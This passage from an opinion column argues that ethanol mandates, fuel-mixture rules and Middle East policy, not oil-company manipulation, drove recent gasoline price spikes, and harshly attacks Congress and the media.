Ethanol is also difficult to ship and store outside of the Midwest , which is causing supply headaches and spot gas shortages along the East Coast and Texas .
These columns warned Republicans this would happen .
As recently as last year , ethanol was selling for $ 1.45 a gallon .
By December it had reached $ 2 and is now going for $ 2.77 .
So refiners are now having to buy both oil and ethanol at sky - high prices .
In short , the only market manipulation has been by politicians .
So , let us trace this sorry story to its most recent beginnings .
( 1 ) Congress requires new fuel mixtures during the warm weather months which are costly and disrupt available supplies , but those mixtures do not make the air any cleaner ; ( 2 ) The President and Congress decide to invade Iraq and now are making threats toward Iran , thus guaranteeing political instability and violence in the largest oil - producing region of the world ; ( 3 ) Congress requires even more ethanol mixtures , despite the fact that it disrupts supplies and ethanol manufacturers cannot meet the goals ; ( 4 ) gasoline prices spike , and members of Congress call for arrest and imprisonment of oil executives .
Something obviously is wrong with this picture .
Not surprisingly , almost all of the anger from consumers — if editorial cartoons are an indication of the direction of the rage — is pointed toward oil companies and their executives .
On the other hand , members of Congress , which created this current crisis , are calling for the near - destruction of oil companies , imprisonment of executives , as well as a whole new set of taxes that would further reduce available fuel supplies — all in the name , of course , of lowering gasoline prices .
We can not put these things into the category of bad policies made by well - meaning people .
Instead , we are seeing the attempted destruction of one of the most vital industries in our country to be carried out by incompetent , venal tyrants who have no intention of telling the truth — and we have a cynical media acting as the mouthpiece .
There is a way out of this mess — reinstitute free markets in gasoline and oil — but Congress and the President of the United States , not to mention those who are politically connected , have no intention of permitting the markets to work .
